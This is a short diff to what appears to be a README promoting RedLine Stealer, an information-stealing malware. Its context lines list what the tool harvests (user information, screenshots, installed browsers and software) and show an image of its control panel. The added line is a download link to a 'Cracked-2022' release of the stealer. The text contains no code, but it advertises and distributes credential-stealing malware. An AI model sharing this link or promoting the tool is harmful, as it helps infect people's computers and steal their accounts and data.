@@ -10,5 +10,7 @@
 - Userinformation and screenshot
 - Installed browsers and software
 
+Download: https://github.com/NighttfallGT/RedlineStealer/releases/tag/Cracked-2022
+
 Panel screenshot:
 ![image](https://user-images.githubusercontent.com/104257061/170255475-04fe28b1-7cc8-4d1a-908b-10aab58b70da.png)
